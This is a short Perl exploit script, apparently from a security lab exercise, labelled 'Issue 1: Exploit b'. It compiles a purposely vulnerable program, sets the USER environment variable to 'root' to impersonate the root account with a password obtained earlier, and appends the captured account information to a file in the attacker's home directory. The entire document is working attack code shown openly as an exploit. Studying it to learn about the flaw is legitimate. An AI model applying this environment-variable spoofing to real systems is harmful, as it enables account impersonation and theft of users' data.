#!/usr/bin/perl

#Issue 1: Exploit b

#Aim: Since all passwords and usernames are available to hacker from exploit a of issue 1, hacker can now can use specific username (i.e root) to steal information and redirect that to hacker's account.

#To compile account_bad.c
system("gcc -g -o /vulnerable/account_bad /vulnerable/account_bad.c");

#To create root account to steal information from.
$ENV{USER} = 'root';
system("/vulnerable/account_bad rootPassword");

#Changing environment variable USER to root on hacker's machine.
$ENV{USER} = 'root';

#login as root and redirect output.
system("/vulnerable/account_bad rootPassword >> /home/hacker/hackedInfo.txt");

#verify of successful exploit
print "#Below is redirected output\n";
system("cat /home/hacker/hackedInfo.txt"); 